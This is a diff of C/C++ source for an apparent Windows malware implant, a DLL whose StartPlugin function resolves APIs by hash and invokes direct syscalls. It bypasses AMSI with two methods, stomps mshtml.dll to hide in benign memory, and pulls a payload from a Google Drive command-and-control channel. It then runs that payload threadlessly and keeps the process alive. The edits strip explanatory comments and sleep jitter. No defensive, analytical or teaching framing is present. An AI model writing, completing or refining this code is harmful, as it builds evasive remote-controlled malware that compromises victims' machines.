@@ -5,8 +5,8 @@
 #include <windows.h>
 #include <winternl.h>
 #include <stdio.h>
-#include <tlhelp32.h>
-#include <shellapi.h>
+#include <stdlib.h>
+#include <time.h>
 #include "crypto.h"
 #include "api_hashes.h"
 #include "gdrive_c2.h"
@@ -14,8 +14,9 @@
 #include "syscalls.h"
 #include "god_mode_stealth.h"
 
-static PVOID g_SyscallGadget = NULL;
-static API_TABLE g_ApiTable = {0};
+// Definiciones globales compartidas
+PVOID g_SyscallGadget = NULL;
+API_TABLE g_ApiTable = {0};
 
 static void InitializeApiTable() {
     PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
@@ -39,23 +40,17 @@ static void InitializeApiTable() {
 
 static void ExecutePayload() {
     uint8_t payload[4096];
-    DWORD payloadSize = 0;
     
-    // 1. Obtener payload del C2
     if (!GDrive_CheckForCommands((char*)payload, sizeof(payload))) return;
-    payloadSize = 4096; // Ajustar a tamaño real recibido
 
-    // 2. Memoria RX vía Syscalls Directos
     PVOID pExec = NULL;
-    SIZE_T size = payloadSize;
+    SIZE_T size = sizeof(payload);
     InvokeSyscall(g_ApiTable.NtAllocateVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     if (pExec) {
         InvokeSyscall(g_ApiTable.NtWriteVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, pExec, payload, size, NULL);
         ULONG old;
         InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, &size, PAGE_EXECUTE_READ, &old);
-        
-        // Ejecución Threadless
         ThreadlessExecute(pExec);
     }
 }
@@ -64,19 +59,16 @@ extern "C" __declspec(dllexport) void StartPlugin() {
     g_SyscallGadget = FindSyscallGadgetViaHash();
     InitializeApiTable();
     
-    // Bypass AMSI (Estrategia Múltiple)
     BypassAMSI_HWBP(); 
     BypassAMSI_DataOnlyRobust();
 
-    // Module Stomping para persistencia en memoria benigna
     STOMP_CONTEXT ctx = {0};
-    if (ModuleStompRobust(L"mshtml.dll", 0x2000, &ctx)) {
+    if (ModuleStompRobust(L"mshtml.dll", 0x1000, &ctx)) {
         ExecutePayload();
     }
 
-    // Mantener proceso vivo con jitter
     while (TRUE) {
-        Sleep(60000 + (rand() % 10000));
+        Sleep(60000);
     }
 }
 
